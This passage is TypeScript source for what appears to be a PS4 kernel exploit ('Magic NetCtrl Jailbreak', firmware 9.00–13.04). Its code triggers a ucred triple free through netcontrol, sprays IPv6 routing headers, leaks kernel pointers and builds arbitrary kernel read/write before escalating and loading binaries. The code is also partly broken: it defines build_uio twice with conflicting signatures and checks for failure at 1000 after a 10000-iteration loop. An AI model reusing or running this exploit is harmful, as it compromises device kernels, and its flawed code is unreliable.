    }
  }
}

function wait_uio_writev (): void {
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    wait_for(uio_writev_workers[i].done, 1)
  }
}

function trigger_ipv6_spray_and_read (): void {
  write64(spray_ipv6_worker.done, 0)

  const ret = spawn_thread(
    spray_ipv6_worker.rop,
    spray_ipv6_worker.loop_size,
    spray_ipv6_stack
  )

  if (ret.eq(BigInt_Error)) {
    throw new Error('Could not spawn spray_ipv6_worker')
  }

  spray_ipv6_worker.thread_id = Number(ret.and(0xFFFFFFFF))

  const w = write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1)
  if (w.eq(BigInt_Error)) {
    throw new Error("Could not signal 'run' spray_ipv6_worker")
  }
}

function wait_ipv6_spray_and_read (): void {
  wait_for(spray_ipv6_worker.done, 1)
}

/* ===========================
  *   Initialization (init)
  * ===========================
  */

function init (): boolean {
  log('====mz==== PS4 Magic NetCtrl Jailbreak ====mz====')
  log('                          By ELHOUT')
  log('build: stable-clean (no crash)')

  FW_VERSION = get_fwversion()
  log('PS4 Firmware = ' + FW_VERSION)

  if (FW_VERSION === null) {
    log('Failed to detect PS4 firmware version. Aborting...')
    send_notification('Failed to detect PS4 firmware version.\nAborting...')
    return false
  }

  const compare_version = (a: string, b: string): number => {
    const aa = a.split('.')
    const bb = b.split('.')
    const amaj = Number(aa[0])
    const amin = Number(aa[1])
    const bmaj = Number(bb[0])
    const bmin = Number(bb[1])
    return amaj === bmaj ? amin - bmin : amaj - bmaj
  }

  if (compare_version(FW_VERSION, '9.00') < 0 ||
        compare_version(FW_VERSION, '13.04') > 0) {
    log('Unsupported PS4 firmware (Supported: 9.00–13.04). Aborting...')
    send_notification('Unsupported PS4 firmware\nAborting...')
    return false
  }

  kernel_offset = get_kernel_offset(FW_VERSION)
  log('Kernel offsets : loaded for FW ' + FW_VERSION)

  return true
}

/* ===========================
  *   Setup
  * ===========================
  */

let prev_core = -1
let prev_rtprio = -1
let cleanup_called = false

function setup (): void {
  log('Preparing netctrl...')

  prev_core = get_current_core()
  prev_rtprio = get_rtprio()

  pin_to_core(MAIN_CORE)
  set_rtprio(MAIN_RTPRIO)

  log('Pinned to core ' + MAIN_CORE + ' (previous: ' + prev_core + ')')

  // Prepare spray buffer
  spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE)

  // Pre-fill ROP spray buffer
  for (let i = 0; i < IPV6_SOCK_NUM; i++) {
    build_rthdr(spray_rthdr_rop.add(i * UCRED_SIZE), UCRED_SIZE)
    write32(spray_rthdr_rop.add(i * UCRED_SIZE + 0x04), RTHDR_TAG | i)
  }

  // Prepare msg iov
  write64(msg.add(0x10), msgIov)
  write64(msg.add(0x18), MSG_IOV_NUM)

  const dummyBuffer = malloc(0x1000)
  fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000)

  write64(uioIovRead.add(0x00), dummyBuffer)
  write64(uioIovWrite.add(0x00), dummyBuffer)

  // Create socket pair for uio spraying
  socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock)
  uio_sock_0 = read32(uio_sock)
  uio_sock_1 = read32(uio_sock.add(4))

  // Create socket pair for iov spraying
  socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock)
  iov_sock_0 = read32(iov_sock)
  iov_sock_1 = read32(iov_sock.add(4))

  // Create ipv6 sockets
  for (let i = 0; i < ipv6_socks.length; i++) {
    ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0)
  }

  // Initialize pktopts
  free_rthdrs(ipv6_socks)

  // Create pipes
  pipe(pipe_sock)
  master_pipe[0] = read32(pipe_sock)
  master_pipe[1] = read32(pipe_sock.add(4))

  pipe(pipe_sock)
  victim_pipe[0] = read32(pipe_sock)
  victim_pipe[1] = read32(pipe_sock.add(4))

  masterRpipeFd = master_pipe[0]
  masterWpipeFd = master_pipe[1]
  victimRpipeFd = victim_pipe[0]
  victimWpipeFd = victim_pipe[1]

  fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK)
  fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK)
  fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK)
  fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK)

  // Create workers
  create_workers()
  init_workers()

  log(`Spawned workers iov[${IOV_THREAD_NUM}] uio_readv[${UIO_THREAD_NUM}] uio_writev[${UIO_THREAD_NUM}]`)
}

/* ===========================
  *   Cleanup
  * ===========================
  */

function cleanup (kill_workers: boolean = false): void {
  if (cleanup_called) return
  cleanup_called = true

  log('Cleaning up...')

  // Close ipv6 sockets
  for (let i = 0; i < ipv6_socks.length; i++) {
    close(ipv6_socks[i])
  }

  // Kill workers
  for (const worker of iov_recvmsg_workers) {
    write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
    if (kill_workers && worker.thread_id !== undefined) {
      thr_kill(worker.thread_id, 9)
    }
  }

  for (const worker of uio_readv_workers) {
    write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
    if (kill_workers && worker.thread_id !== undefined) {
      thr_kill(worker.thread_id, 9)
    }
  }

  for (const worker of uio_writev_workers) {
    write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
    if (kill_workers && worker.thread_id !== undefined) {
      thr_kill(worker.thread_id, 9)
    }
  }

  write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1)
  if (kill_workers && spray_ipv6_worker.thread_id !== undefined) {
    thr_kill(spray_ipv6_worker.thread_id, 9)
  }

  // Close main sockets
  close(new BigInt(uio_sock_1))
  close(new BigInt(uio_sock_0))
  close(new BigInt(iov_sock_1))
  close(new BigInt(iov_sock_0))

  // Restore core + priority
  if (prev_core >= 0) {
    pin_to_core(prev_core)
    prev_core = -1
  }

  set_rtprio(prev_rtprio)

  log('Cleanup completed')
}

/* ===========================
  *   Logging Screen
  * ===========================
  */

const LOG_MAX_LINES = 38
const LOG_COLORS = ['#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F', '#4DABF7', '#9775FA', '#DA77F2']
function setup_log_screen () {
  jsmaf.root.children.length = 0

  const bg = new Image({
    url: 'file:///../download0/img/multiview_bg_VAF.png',
    x: 0,
    y: 0,
    width: 1920,
    height: 1080
  })
  jsmaf.root.children.push(bg)

  for (let i = 0; i < LOG_COLORS.length; i++) {
    new Style({ name: 'log' + i, color: LOG_COLORS[i], size: 20 })
  }

  const logLines: jsmaf.Text[] = []
  const logBuf: string[] = []

  for (let i = 0; i < LOG_MAX_LINES; i++) {
    const line = new jsmaf.Text()
    line.text = ''
    line.style = 'log' + (i % LOG_COLORS.length)
    line.x = 20
    line.y = 120 + i * 20
    jsmaf.root.children.push(line)
    logLines.push(line)
  }

  _log = function (msg: string, screen: boolean) {
    if (screen) {
      logBuf.push(msg)
      if (logBuf.length > LOG_MAX_LINES) logBuf.shift()
      for (let i = 0; i < LOG_MAX_LINES; i++) {
        logLines[i].text = i < logBuf.length ? logBuf[i] : ''
      }
    }
    ws.broadcast(msg)
  }
}

/* ===========================
 *   Watchdog (progress monitor)
 * =========================== */

let WATCHDOG_LAST_TICK = Date.now()
let WATCHDOG_ACTIVE = false

function watchdog_tick(label: string): void {
  WATCHDOG_LAST_TICK = Date.now()
  log('[WD] tick: ' + label)
}

function watchdog_start(timeoutMs: number = 5000): void {
  if (WATCHDOG_ACTIVE) return

  WATCHDOG_ACTIVE = true
  log('[FLOW] Watchdog started (timeout = ' + timeoutMs + 'ms)')

  const id = jsmaf.setInterval(() => {
    const delta = Date.now() - WATCHDOG_LAST_TICK

    if (delta > timeoutMs) {
      log('[WD] TIMEOUT — no progress for ' + delta + 'ms')
      log('[FLOW] Watchdog triggered fallback → exploit_phase_trigger')

      WATCHDOG_ACTIVE = false
      jsmaf.clearInterval(id)

      // رجوع آمن للفلو
      yield_to_render(exploit_phase_trigger)

      log('[FLOW] Watchdog stopped after timeout')
    }
  }, 500)
}

/* ===========================
  *   Twins Finder
  * ===========================
  */

function find_twins (): boolean {
  let count = 0
  let val: number
  let i: number
  let j: number
  let zeroMemoryCount = 0

  const spray_add = spray_rthdr.add(0x04)
  const leak_add = leak_rthdr.add(0x04)

  while (count < MAX_ROUNDS_TWIN) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++
      if (zeroMemoryCount >= 5) {
        log('netctrl failed!')
        cleanup()
        return false
      }
    } else {
      zeroMemoryCount = 0
    }

    for (i = 0; i < ipv6_socks.length; i++) {
      write32(spray_add, RTHDR_TAG | i)
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len)
    }

    for (i = 0; i < ipv6_socks.length; i++) {
      get_rthdr(ipv6_socks[i], leak_rthdr, 8)
      val = read32(leak_add)
      j = val & 0xFFFF

      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
        twins[0] = i
        twins[1] = j
        log('Twins found: [' + i + '] [' + j + ']')
        return true
      }
    }

    count++
  }

  log('find_twins failed')
  return false
}

/* ===========================
  *   Triplet Finder
  * ===========================
  */

function find_triplet (master: number, other: number, iterations: number = MAX_ROUNDS_TRIPLET): number {
  let count = 0
  let val: number
  let i: number
  let j: number

  const spray_add = spray_rthdr.add(0x04)
  const leak_add = leak_rthdr.add(0x04)

  while (count < iterations) {
    for (i = 0; i < ipv6_socks.length; i++) {
      if (i === master || i === other) {
        continue
      }

      write32(spray_add, RTHDR_TAG | i)
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len)
    }

    get_rthdr(ipv6_socks[master], leak_rthdr, 8)
    val = read32(leak_add)
    j = val & 0xFFFF

    if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
      return j
    }

    count++
  }

  return -1
}

function trigger_ucred_triplefree (): boolean {
  let end = false
  write64(msgIov.add(0x0), new BigInt(1))
  write64(msgIov.add(0x8), new BigInt(1))

  let main_count = 0

  while (!end && main_count < TRIPLEFREE_ITERATIONS) {
    main_count++

    const dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0)

    // Register dummy socket
    write32(nc_set_buf, Number(dummy_socket) & 0xFFFFFFFF)
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8)
    close(new BigInt(dummy_socket))

    // Allocate new ucred
    setuid(1)

    // Reclaim FD
    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0))

    // Free previous ucred
    setuid(1)

    // Unregister dummy socket
    write32(nc_clear_buf, uaf_socket)
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8)

    // Reclaim with iov
    for (let i = 0; i < 32; i++) {
      trigger_iov_recvmsg()
      sched_yield()
      write(new BigInt(iov_sock_1), tmp, 1)
      wait_iov_recvmsg()
      read(new BigInt(iov_sock_0), tmp, 1)
    }

    // Double free ucred
    close(dup(new BigInt(uaf_socket)))

    // Find twins
    end = find_twins()
    if (!end) {
      if (cleanup_called) throw new Error('Netctrl failed - Reboot and try again')
      close(new BigInt(uaf_socket))
      continue
    }

    log('[TRIPLE] Twins found, starting triple free')

    // Free one
    free_rthdr(ipv6_socks[twins[1]])

    let count = 0
    while (count < 10000) {
      trigger_iov_recvmsg()
      sched_yield()

      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8)
      if (read32(leak_rthdr) === 1) break

      write(new BigInt(iov_sock_1), tmp, 1)
      wait_iov_recvmsg()
      read(new BigInt(iov_sock_0), tmp, 1)

      count++
    }

    if (count === 1000) {
      log('[TRIPLE] Dropped out from reclaim loop')
      close(new BigInt(uaf_socket))
      continue
    }

    triplets[0] = twins[0]

    // Triple free
    close(dup(new BigInt(uaf_socket)))

    // Find triplet 1
    triplets[1] = find_triplet(triplets[0], -1)
    if (triplets[1] === -1) {
      log("[TRIPLE] Couldn't find triplet 1")
      write(new BigInt(iov_sock_1), tmp, 1)
      close(new BigInt(uaf_socket))
      end = false
      continue
    }

    write(new BigInt(iov_sock_1), tmp, 1)

    // Find triplet 2
    triplets[2] = find_triplet(triplets[0], triplets[1])
    if (triplets[2] === -1) {
      log("[TRIPLE] Couldn't find triplet 2")
      close(new BigInt(uaf_socket))
      end = false
      continue
    }

    wait_iov_recvmsg()
    read(new BigInt(iov_sock_0), tmp, 1)
  }

  if (main_count === TRIPLEFREE_ITERATIONS) {
    log('[TRIPLE] Failed to triple free after max iterations')
    return false
  }

  log('[TRIPLE] Triple free succeeded, leaking kqueue next')
  return true
}

/* ===========================
  *   Leak kqueue
  * ===========================
  */
function leak_kqueue (): boolean {
  log('[LEAK] Enter leak_kqueue')
  log('[LEAK] Starting kqueue leak phase')

  // Free one.
  free_rthdr(ipv6_socks[triplets[1]])

  // Leak kqueue.
  let kq = new BigInt(0)

  // Minimizing footprint
  const magic_val = new BigInt(0x0, 0x1430000)
  const magic_add = leak_rthdr.add(0x08)

  let count = 0

  while (count < KQUEUE_ITERATIONS) {
    if ((count % 500) === 0) {
      log('[LEAK] Progress iteration=' + count)
      watchdog_tick('leak_kqueue_loop')
    }

    kq = kqueue()
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100)

    const cur_magic = read64(magic_add)
    const cur_fdp = read64(leak_rthdr.add(0x98))

    log(
      '[LEAK] iter=' + count +
        ' magic=' + hex(cur_magic) +
        ' fdp=' + hex(cur_fdp)
    )

    if (cur_magic.eq(magic_val) && !cur_fdp.eq(0)) {
      log('[LEAK] Pattern matched, breaking loop')
      break
    }

    close(kq)
    sched_yield()
    count++
  }

  if (count === KQUEUE_ITERATIONS) {
    log('[LEAK] Failed to leak kqueue_fdp after ' + count + ' iterations')
    return false
  }

  kl_lock = read64(leak_rthdr.add(0x60))
  kq_fdp = read64(leak_rthdr.add(0x98))

  if (kq_fdp.eq(0)) {
    log('[LEAK] Failed to leak kqueue_fdp (kq_fdp == 0)')
    return false
  }

  log('[LEAK] kq_fdp=' + hex(kq_fdp) + ' kl_lock=' + hex(kl_lock))

  // Close kqueue to free buffer.
  close(kq)

  // Find new triplets[1]
  triplets[1] = find_triplet(triplets[0], triplets[2])

  return true
}

/* ===========================
  *   uio/KR/KW
  * ===========================
  */

function build_uio(
  uio_iov: BigInt,
  offset: number,
  read: boolean,
  addr: BigInt,
  size: number
): void {

  log('[UIO] build_uio called')
  log(`[UIO] addr=${addr} size=${size} offset=${offset}`)

  // msg_iov[0].iov_base = addr
  write64(msgIov.add(0x00), addr)
  // msg_iov[0].iov_len = size
  write64(msgIov.add(0x08), size)

  // msg_iov[1].iov_base = uio_iov + offset
  write64(msgIov.add(0x10), uio_iov.add(offset))
  // msg_iov[1].iov_len = size
  write64(msgIov.add(0x18), size)

  // msg_iov pointer + length
  write64(msg.add(0x10), msgIov)
  write64(msg.add(0x18), 2)

  // msg_name = NULL
  write64(msg.add(0x00), 0n)
  write32(msg.add(0x08), 0)

  // msg_control = NULL
  write64(msg.add(0x20), 0n)
  write64(msg.add(0x28), 0)

  // msg_flags = 0
  write32(msg.add(0x2C), 0)

  log('[UIO] build_uio done')
}


function build_uio(
  uio: BigInt,
  uio_iov: BigInt,
  uio_td: number,
  read: boolean,
  addr: BigInt,
  size: number
) {
  log('[UIO] build_uio ENTER')

  // --- Debug incoming values ---
  log(`[UIO] uio       = ${uio}`)
  log(`[UIO] uio_iov   = ${uio_iov}`)
  log(`[UIO] uio_td    = ${uio_td}`)
  log(`[UIO] read       = ${read}`)
  log(`[UIO] addr      = ${addr}`)
  log(`[UIO] size    = ${size}`)

  // --- Basic validation ---
  if (!uio || !uio_iov) {
    log('[UIO] ERROR: uio or uio_iov is NULL')
  }
  if (!addr) {
    log('[UIO] WARNING: addr is NULL')
  }
  if (size <= 0) {
    log('[UIO] WARNING: size is invalid')
  }

  // --- Write fields (placeholders only) ---
  log('[UIO] writing uio_iov')
  write64(uio.add(0x00), uio_iov)        // uio_iov

  log('[UIO] writing uio_iovcnt')
  write64(uio.add(0x08), UIO_IOV_NUM)    // uio_iovcnt

  log('[UIO] writing uio_offset')
  write64(uio.add(0x10), BigInt_Error)   // uio_offset

  log('[UIO] writing uio_resid')
  write64(uio.add(0x18), size)           // uio_resid

  log('[UIO] writing uio_segflg')
  write32(uio.add(0x20), UIO_SYSSPACE)   // uio_segflg

  log('[UIO] writing uio_rw')
  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ) // uio_segflg

  log('[UIO] writing uio_td')
  write64(uio.add(0x28), uio_td)         // uio_td

  // --- iov entry ---
  log('[UIO] writing iov_base')
  write64(uio.add(0x30), addr)           // iov_base

  log('[UIO] writing iov_len')
  write64(uio.add(0x38), size)           // iov_len

  log('[UIO] build_uio EXIT')
}


function kreadslow (addr: BigInt, size: number): BigInt {
  debug('[KR] Enter kreadslow addr=' + hex(addr) + ' size=' + size)

  // Memory check before start
  if (debugging.info.memory.available === 0) {
    log('[KR] kreadslow - Memory exhausted before start')
    cleanup()
    return BigInt_Error
  }

  debug('[KR] Preparing leak buffers...')

  const leak_buffers: BigInt[] = new Array(UIO_THREAD_NUM)
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    leak_buffers[i] = malloc(size)
  }

  write32(sockopt_val_buf, size)
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)

  write(new BigInt(uio_sock_1), tmp, size)
  write64(uioIovRead.add(0x08), size)

  free_rthdr(ipv6_socks[triplets[1]])

  const uio_leak_add = leak_rthdr.add(0x08)

  debug('[KR] Starting UIO reclaim loop (stage 1)...')

  let count = 0
  let zeroMemoryCount = 0

  while (count < 10000) {
    if ((count % 500) === 0) {
      log('[KR] Stage1 progress count=' + count)
      watchdog_tick('kreadslow_stage1')
    }

    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++
      if (zeroMemoryCount >= 5) {
        log('[KR] netctrl failed (memory exhausted in stage1)')
        cleanup()
        return BigInt_Error
      }
    } else {
      zeroMemoryCount = 0
    }

    count++
    trigger_uio_writev()
    sched_yield()

    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10)

    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      break
    }

    read(new BigInt(uio_sock_0), tmp, size)

    for (let i = 0; i < UIO_THREAD_NUM; i++) {
      read(new BigInt(uio_sock_0), leak_buffers[i], size)
    }

    wait_uio_writev()
    write(new BigInt(uio_sock_1), tmp, size)
  }

  if (count === 10000) {
    debug('[KR] Failed UIO reclaim after 10000 iterations')
    return BigInt_Error
  }

  debug('[KR] UIO reclaim succeeded after ' + count + ' iterations')

  const uio_iov = read64(leak_rthdr)
  debug('[KR] uio_iov=' + hex(uio_iov))

  build_uio(msgIov, uio_iov, 0, true, addr, size)

  debug('[KR] Freeing triplets[2]=' + triplets[2])

  free_rthdr(ipv6_socks[triplets[2]])

  const iov_leak_add = leak_rthdr.add(0x20)

  debug('[KR] Starting IOV reclaim loop (stage 2)...')

  let zeroMemoryCount2 = 0
  let count2 = 0

  while (true) {
    count2++

    if ((count2 % 500) === 0) {
      log('[KR] Stage2 spinning, count=' + count2)
      watchdog_tick('kreadslow_stage2')
    }

    if (debugging.info.memory.available === 0) {
      zeroMemoryCount2++
      if (zeroMemoryCount2 >= 5) {
        log('[KR] netctrl failed (memory exhausted in stage2)')
        cleanup()
        return BigInt_Error
      }
    } else {
      zeroMemoryCount2 = 0
    }

    trigger_iov_recvmsg()
    sched_yield()

    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40)

    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      break
    }

    write(new BigInt(iov_sock_1), tmp, 1)
    wait_iov_recvmsg()
    read(new BigInt(iov_sock_0), tmp, 1)
  }

  debug('[KR] Reading leak buffers...')

  read(new BigInt(uio_sock_0), tmp, size)

  let leak_buffer = new BigInt(0)
  const tag_val = new BigInt(0x41414141, 0x41414141)

  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    read(new BigInt(uio_sock_0), leak_buffers[i], size)
    const val = read64(leak_buffers[i])

    if (!val.eq(tag_val)) {
      triplets[1] = find_triplet(triplets[0], -1)
      debug('[KR] Updated triplets[1]=' + triplets[1])
      leak_buffer = leak_buffers[i].add(0)
    }
  }

  wait_uio_writev()
  write(new BigInt(iov_sock_1), tmp, 1)

  if (leak_buffer.eq(new BigInt(0))) {
    wait_iov_recvmsg()
    read(new BigInt(iov_sock_0), tmp, 1)
    return BigInt_Error
  }

  debug('[KR] Finding triplets[2]...')

  for (let retry = 0; retry < 3; retry++) {
    triplets[2] = find_triplet(triplets[0], triplets[1])
    if (triplets[2] !== -1) break
    sched_yield()
  }

  debug('[KR] triplets[2]=' + triplets[2])

  if (triplets[2] === -1) {
    wait_iov_recvmsg()
    read(new BigInt(iov_sock_0), tmp, 1)
    return BigInt_Error
  }

  wait_iov_recvmsg()
  read(new BigInt(iov_sock_0), tmp, 1)

  debug('[KR] Done, returning leak_buffer=' + hex(leak_buffer))

  return leak_buffer
}

function kreadslow64 (address: BigInt): BigInt {
  const buffer = kreadslow(address, 8)

  if (buffer.eq(BigInt_Error)) {
    log('[KR] kreadslow64 failed for addr=' + hex(address))
    return BigInt_Error
  }

  return read64(buffer)
}

function kwriteslow (addr: BigInt, buffer: BigInt, size: number): BigInt {
  log('[KW] Enter kwriteslow addr=' + hex(addr) + ' buffer=' + hex(buffer) + ' size=' + size)

  write32(sockopt_val_buf, size)
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)

  write64(uioIovWrite.add(0x08), size)

  free_rthdr(ipv6_socks[triplets[1]])

  const uio_leak_add = leak_rthdr.add(0x08)
  let zeroMemoryCount = 0
  let stage1Count = 0

  while (true) {
    if ((stage1Count % 500) === 0) {
      log('[KW] Stage1 progress=' + stage1Count)
      watchdog_tick('kwriteslow_stage1')
    }

    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++
      if (zeroMemoryCount >= 5) {
        log('[KW] kwriteslow: memory exhausted in stage1')
        cleanup()
        return BigInt_Error
      }
    } else {
      zeroMemoryCount = 0
    }

    stage1Count++

    trigger_uio_readv()
    sched_yield()

    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10)

    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      break
    }

    for (let i = 0; i < UIO_THREAD_NUM; i++) {
      write(new BigInt(uio_sock_1), buffer, size)
    }

    wait_uio_readv()
  }

  const uio_iov = read64(leak_rthdr)

  build_uio(uio_iov, 0, false, addr, size)

  free_rthdr(ipv6_socks[triplets[2]])

  const iov_leak_add = leak_rthdr.add(0x20)
  let zeroMemoryCount2 = 0
  let stage2Count = 0

  while (true) {
    if ((stage2Count % 500) === 0) {
      log('[KW] Stage2 progress=' + stage2Count)
      watchdog_tick('kwriteslow_stage2')
    }

    if (debugging.info.memory.available === 0) {
      zeroMemoryCount2++
      if (zeroMemoryCount2 >= 5) {
        log('[KW] kwriteslow: memory exhausted in stage2')
        cleanup()
        return BigInt_Error
      }
    } else {
      zeroMemoryCount2 = 0
    }

    stage2Count++

    trigger_iov_recvmsg()
    sched_yield()

    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40)

    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      break
    }

    write(new BigInt(iov_sock_1), tmp, 1)
    wait_iov_recvmsg()
    read(new BigInt(iov_sock_0), tmp, 1)
  }

  for (let j = 0; j < UIO_THREAD_NUM; j++) {
    write(new BigInt(uio_sock_1), buffer, size)
  }

  triplets[1] = find_triplet(triplets[0], -1)

  wait_uio_readv()

  write(new BigInt(iov_sock_1), tmp, 1)

  for (let retry = 0; retry < 3; retry++) {
    triplets[2] = find_triplet(triplets[0], triplets[1])
    if (triplets[2] !== -1) break
    sched_yield()
  }

  if (triplets[2] === -1) {
    log('[KW] kwriteslow - Failed to find triplets[2]')
    wait_iov_recvmsg()
    read(new BigInt(iov_sock_0), tmp, 1)
    return BigInt_Error
  }

  wait_iov_recvmsg()
  read(new BigInt(iov_sock_0), tmp, 1)

  return new BigInt(0)
}

/* ===========================
  *   Arbitrary Kernel R/W Setup
  * ===========================
  */

function setup_arbitrary_rw (): boolean {
  log('[RW] setup_arbitrary_rw: start')

  const fd_files = kreadslow64(kq_fdp)
  if (fd_files.eq(BigInt_Error)) {
    log('[RW] kreadslow64(kq_fdp) failed')
    return false
  }

  fdt_ofiles = fd_files.add(0x00)
  debug('[RW] fdt_ofiles=' + hex(fdt_ofiles))

  const master_r_pipe_file = kreadslow64(
    fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE)
  )
  if (master_r_pipe_file.eq(BigInt_Error)) {
    debug('[RW] master_r_pipe_file=' + hex(master_r_pipe_file))
    return false
  }

  const victim_r_pipe_file = kreadslow64(
    fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE)
  )
  if (victim_r_pipe_file.eq(BigInt_Error)) {
    debug('[RW] victim_r_pipe_file=' + hex(victim_r_pipe_file))
    return false
  }

  master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00))
  if (master_r_pipe_data.eq(BigInt_Error)) {
    debug('[RW] master_r_pipe_data=' + hex(master_r_pipe_data))
    return false
  }

  victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00))
  if (victim_r_pipe_data.eq(BigInt_Error)) {
    debug('[RW] victim_r_pipe_data=' + hex(victim_r_pipe_data))
    return false
  }

  write32(master_pipe_buf.add(0x00), 0)
  write32(master_pipe_buf.add(0x04), 0)
  write32(master_pipe_buf.add(0x08), 0)
  write32(master_pipe_buf.add(0x0C), PAGE_SIZE)
  write64(master_pipe_buf.add(0x10), victim_r_pipe_data)

  let ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
  if (ret_write.eq(BigInt_Error)) {
    log('[RW] kwriteslow failed (memory exhausted or invalid)')
    return false
  }

  let kws_success = 0
  for (let i = 0; i < 3; i++) {
    if (kread64(master_r_pipe_data.add(0x10)).eq(victim_r_pipe_data)) {
      kws_success = 1
      break
    }
    debug('[RW] kwriteslow did not work - retry #' + (i + 1))
    ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
    if (ret_write.eq(BigInt_Error)) {
      cleanup()
      throw new Error('Netctrl failed - Shutdown and try again')
    }
  }

  if (kws_success === 0) {
    throw new Error('Netctrl failed - Shutdown and try again')
  }

  fhold(fget(master_pipe[0]))
  fhold(fget(master_pipe[1]))
  fhold(fget(victim_pipe[0]))
  fhold(fget(victim_pipe[1]))

  remove_rthr_from_socket(ipv6_socks[triplets[0]])
  remove_rthr_from_socket(ipv6_socks[triplets[1]])
  remove_rthr_from_socket(ipv6_socks[triplets[2]])

  remove_uaf_file()

  for (let i = 0; i < 0x20; i = i + 8) {
    const readed = kread64(master_r_pipe_data.add(i))
    debug('[RW] master_r_pipe_data[' + i + '] = ' + hex(readed))
  }

  log('[RW] setup_arbitrary_rw: success')
  debug('[RW] victim_r_pipe_file=' + hex(kread64(victim_r_pipe_file)))
  return true
}

/* ===========================
  *   kread / kwrite wrappers
  * =========================== */

function kread64 (addr: BigInt): BigInt {
  return kreadslow64(addr)
}

function kread32 (addr: BigInt): number {
  const buf = kreadslow(addr, 4)

  if (buf.eq(BigInt_Error)) {
    log('[KR] kread32 failed at addr: ' + hex(addr))
    // نرجّع قيمة مميزة (مثلاً 0) ونسيب اللي فوق يقرّر
    return 0
  }

  return read32(buf)
}

function kwrite64 (addr: BigInt, val: BigInt): boolean {
  const buf = malloc(8)
  write64(buf, val)

  const ret = kwriteslow(addr, buf, 8)
  if (ret.eq(BigInt_Error)) {
    log('[KW] kwrite64 failed at addr: ' + hex(addr) + ' val: ' + hex(val))
    return false
  }

  return true
}

function kwrite32 (addr: BigInt, val: number): boolean {
  const buf = malloc(4)
  write32(buf, val)

  const ret = kwriteslow(addr, buf, 4)
  if (ret.eq(BigInt_Error)) {
    log('[KW] kwrite32 failed at addr: ' + hex(addr) + ' val: ' + val)
    return false
  }

  return true
}

/* ===========================
  *   Jailbreak
  * ===========================
  */

function find_allproc (): BigInt {
  const pipe_0 = master_pipe[0]
  const pipe_1 = master_pipe[1]

  const pid = Number(getpid())
  write32(sockopt_val_buf, pid)

  ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf)

  const fp = fget(pipe_0)
  const f_data = kread64(fp.add(0x00))
  const pipe_sigio = kread64(f_data.add(0xd0))
  let p = kread64(pipe_sigio)

  kernel.addr.curproc = p

  let walk_count = 0
  while (!p.and(new BigInt(0xFFFFFFFF, 0x00000000)).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
    p = kread64(p.add(0x08))
    walk_count++
  }

  return p
}

function jailbreak (): void {
  if (!kernel_offset) throw new Error('Kernel offsets not loaded')
  if (FW_VERSION === null) throw new Error('FW_VERSION is null')

  for (let i = 0; i < 10; i++) sched_yield()

  kernel.addr.allproc = find_allproc()

  const ko = kernel_offset as { KL_LOCK: number }
  kernel.addr.base = kl_lock.sub(ko.KL_LOCK)

  log('Kernel base: ' + hex(kernel.addr.base))

  jailbreak_shared(FW_VERSION)

  log('Jailbreak Complete')
  utils.notify('Jailbreak succeeded')
  utils.notify('Magic Code : By M.ELHOUT +201007557781')
  utils.notify('Thanks : enjoy')
  cleanup(false)
  show_success()
  run_binloader()
}

/* ===========================
  *   Kernel R/W Primitives
  * ===========================
  */

function fhold (fp: BigInt): void {
  const old = kread32(fp.add(0x28))
  const ok = kwrite32(fp.add(0x28), old + 1)

  if (!ok) {
    log('[FHOLD] kwrite32 failed for fp: ' + hex(fp))
  }
}

function fget (fd: number): BigInt {
  const f = kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE))
